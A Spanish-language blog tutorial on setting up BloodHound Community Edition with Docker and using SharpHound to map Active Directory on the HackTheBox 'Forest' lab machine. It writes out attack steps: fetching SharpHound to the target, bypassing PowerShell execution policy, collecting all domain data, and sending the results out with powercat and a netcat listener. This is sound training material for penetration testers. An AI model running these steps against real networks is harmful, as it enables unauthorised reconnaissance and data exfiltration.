
---
title: "Cómo Configurar BloodHound Community Edition"
summary: "Explicación rápida sobre cómo poner en funcionamiento BloodHound en unos minutos. Esta publicación incluye una guía de instalación paso a paso de **BloodHound**, así como la descarga de **SharpHound** y su carga en una máquina para mapear una red de Active Directory."
categories: ["Post","Blog",]
tags: ["post","bloodhound","sharphound"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-11

---

## BloodHound 
**BloodHound** es una herramienta poderosa y ampliamente utilizada en el campo de la ciberseguridad, particularmente para los evaluadores de penetración en entornos corporativos. Está diseñada para mapear y analizar las estructuras de Active Directory, ayudando a identificar configuraciones de seguridad incorrectas y posibles rutas de ataque que un adversario podría explotar para escalar privilegios u obtener acceso a recursos confidenciales.

**BloodHound** opera mediante la recopilación y visualización de relaciones dentro de un dominio de AD. Estas relaciones incluyen membresías de grupos, permisos de usuario, relaciones de confianza y más. La fortaleza de la herramienta radica en su capacidad para descubrir cadenas complejas de privilegios que podrían ser invisibles para los administradores que auditan manualmente la seguridad de AD.

Realizaremos una instalación rápida paso a paso de la versión comunitaria de **BloodHound**, así como un pequeño tutorial paso a paso sobre cómo ejecutar **BloodHound** y **SharpHound** tomando como ejemplo la máquina [Forest](https://s3ntinl.github.io/pt-pt/posts/forest/) de HackTheBox. ¡Échale un vistazo si aún no lo has hecho a mi post!

¡Comencemos!

- - -
## Instalación
Primero, necesitamos instalar _Docker_:

```bash
kali@kali:~$ sudo apt install -y docker.io

kali@kali:~$ sudo systemctl enable docker --now
```

Luego, crea el grupo _docker_ si no existe:

```bash
kali@kali:~$ sudo groupadd docker
```

Añade tu usuario al grupo _docker_:

```bash
kali@kali:~$ sudo usermod -aG docker $USER
```

Ahora, instala **docker-compose** desde [github](https://github.com/docker/compose/). Además, recuerda otorgarle derechos de ejecución al binario y agregarlo al directorio `/usr/bin`.

```bash
kali@kali:~$ mv ./docker-compose-linux-aarch64 docker-compose
kali@kali:~$ chmod +x ./docker-compose
kali@kali:~$ mv ./docker-compose /usr/bin/
```

Por último, necesitamos copiar el archivo `docker-compose.yml` de **BloodHound** para guardarlo localmente:

```bash
kali@kali:~$ sudo wget https://ghst.ly/getbhce -O docker-compose.yml
kali@kali:~$ docker-compose up
```

**BloodHound** estará disponible en el puerto 8080.
- - -
## SharpHound
**SharpHound** es el componente de recopilación de datos de BloodHound. Es una herramienta de C# diseñada para recopilar información de entornos de Active Directory, que luego BloodHound utiliza para mapear y analizar rutas de ataque. SharpHound recopila datos como sesiones de usuario, membresías de grupos, listas de control de acceso (ACL) y relaciones de confianza, lo que brinda a los evaluadores de penetración y analistas de seguridad una vista detallada del entorno.

Los datos recopilados se almacenan en archivos JSON, que luego se importan a BloodHound para visualización y análisis. Juntos, SharpHound y BloodHound son un dúo poderoso para identificar y comprender las debilidades de seguridad en los dominios de AD.

- - -
## Uso de BloodHound y SharpHound

Primero, iniciemos sesión en **BloodHound**. Ya lo tenemos en ejecución, por lo que debemos acceder a él en `http://localhost:8080`.

![bloodhound1](/img/bloodhound/bloodhound1.png)

> La primera vez que accedamos a **BloodHound**, necesitaremos ingresar la contraseña generada aleatoriamente que se encuentra en la ventana de terminal donde se está ejecutando `docker-compose`. Luego, necesitaremos cambiarla. El usuario predeterminado es **admin**.

![bloodhound9](/img/bloodhound/bloodhound9.png)

Ahora, en la pestaña _Descargar recopiladores_, podemos descargar la última versión de **SharpHound**:

![bloodhound3](/img/bloodhound/bloodhound3.png)

Aquí, selecciona **SharpHound**, ¡y estamos casi listos para comenzar a recopilar datos! Solo quedan unos pocos pasos más:

![bloodhound4](/img/bloodhound/bloodhound4.png)

A continuación, carga el ejecutable **SharpHound** en la máquina Windows cuyo Active Directory deseas mapear. Desde nuestra máquina atacante, servimos **SharpHound** desde un servidor _Python_:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound/sharphound]
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina Windows, descargamos **SharpHound** con el siguiente comando:

```powershell
PS C:\Users\svc-alfresco\Desktop> iwr -uri http://10.10.14.18/SharpHound.ps1 -Outfile SharpHound.ps1
```

Después de transferirlo a la máquina Windows, podemos importarlo a PowerShell:

```powershell
PS C:\Users\svc-alfresco\Desktop> powershell -ep bypass

PS C:\Users\svc-alfresco\Desktop> Import-Module .\Sharphound.ps1
```

Ahora, podemos ejecutar el script para recopilar toda la información del dominio. **SharpHound** se basa principalmente en consultas `LDAP` para recopilar datos de Active Directory. Dado que las consultas LDAP son una parte estándar de la comunicación de dominio, cualquier usuario autenticado en el dominio puede ejecutarlas, por lo que SharpHound no requiere privilegios administrativos para la mayoría de sus operaciones.

```powershell
PS C:\Users\svc-alfresco\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop\ -OutputPrefix "forest"
```

Después de la ejecución, veremos un archivo **zip** con toda la información. Eso es lo que necesitamos transferir de vuelta a nuestra máquina atacante. El archivo .bin que **BloodHound** genera es un archivo binario que se utiliza como caché para datos preprocesados. Cuando importa archivos JSON recopilados por SharpHound en BloodHound, procesa los datos y los almacena en una base de datos Neo4j.

El archivo `.bin` sirve como caché local de estos datos procesados ​​para mejorar el rendimiento, pero no necesariamente necesitamos transferirlos de vuelta a nuestra máquina, por lo que lo ignoraremos.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/10/2025   9:29 AM          43554 forest_20250110092905_BloodHound.zip
-a----        1/10/2025   9:15 AM        1942029 SharpHound.ps1

```

Podemos usar nuestro método de transferencia favorito, yo usaré `powercat.exe`:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> powercat -c 10.10.14.18 -p 4444 -i C:\Users\svc-alfresco\Desktop\forest_20250110092905_BloodHound.zip
```

En nuestra máquina atacante, necesitamos abrir un receptor `netcat` para recibir los datos:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound]
└─$ sudo nc -nlvp 4444 > bloodhound.zip
listening on [any] 4444 ...
connect to [10.10.14.18] de (DESCONOCIDO) [10.10.10.161] 50906
```

Una vez que tengamos el archivo zip en nuestra máquina, vamos a subirlo a **BloodHound**. Primero, presione la opción _Administración_.
![bloodhound2](/img/bloodhound/bloodhound2.png)

Importe el archivo zip en la opción _Ingesta de archivos_, en la sección _Recopilación de datos_:

![bloodhound10](/img/bloodhound/bloodhound10.png)

Haga clic y seleccione el archivo _zip_:

![bloodhound5](/img/bloodhound/bloodhound5.png)

¡Genial! Se subió con éxito.

![bloodhound6](/img/bloodhound/bloodhound6.png)

Enseñar cómo hacer consultas con **BloodHound** no está dentro del alcance de esta publicación, pero ejecutemos una consulta rápida "_Shortest Paths to Domain Admins_" para verificar si la ingesta de datos fue exitosa.
![bloodhound7](/img/bloodhound/bloodhound7.png)

¡Funciona! Ahora tiene una instancia de **BloodHound** completamente funcional y en funcionamiento, lista para mapear y analizar su entorno de Active Directory.

## Detener la instancia

Detener la instancia es tan fácil como presionar `Ctrl+C` en la ventana de terminal donde se está ejecutando `docker-compose`.

![bloodhound8](/img/bloodhound/bloodhound8.png)

Si desea configurarlo nuevamente, simplemente ejecute `docker-compose up` y estará listo.

Espero que esta guía te haya resultado útil para configurar todo sin problemas, ya que configurar un entorno de **BloodHound** puede ser complicado al principio. ¡Pruébalo!